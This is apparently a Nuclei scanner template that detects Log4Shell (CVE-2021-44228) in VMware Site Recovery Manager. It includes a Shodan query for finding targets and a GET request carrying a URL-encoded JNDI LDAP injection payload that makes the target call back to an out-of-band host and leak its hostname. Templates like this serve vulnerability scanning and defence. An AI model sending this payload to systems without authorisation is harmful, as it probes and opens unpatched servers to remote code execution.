id: vmware-siterecovery-log4j-rce
info:
  name: VMware Site Recovery Manager - Remote Code Execution (Apache Log4j)
  author: akincibor
  severity: critical
  description: VMware Site Recovery Manager has a vulnerability that allows remote
    code execution through Apache Log4j, thereby enabling attackers to execute malware,
    extract sensitive information, manipulate data, and gain complete control without
    needing credentials.
  reference:
  - https://www.horizon3.ai/the-long-tail-of-log4shell-exploitation/
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  metadata:
    shodan-query: title:"VMware Site Recovery Manager"
    verified: 'true'
    impact: The impact of the VMware Site Recovery Manager vulnerability is significant,
      as it allows an attacker to take full control of a system without authentication,
      potentially leading to data theft, modification, and disruption.
    recommendation: Patch and update VMware Site Recovery Manager immediately to prevent
      potential remote code execution attacks.
  tags: cve,cve2021,jndi,log4j,rce,oast,vmware,kev
requests:
- method: GET
  path:
  - '{{BaseURL}}/dr/authentication/oauth2/oauth2login?error=%24%7Bjndi%3Aldap%3A%2F%2F%24%7BhostName%7D.{{interactsh-url}}%7D'
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
  - type: word
    part: body
    words:
    - <title>Error - Site Recovery</title>
  extractors:
  - type: kval
    kval:
    - interactsh_ip
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
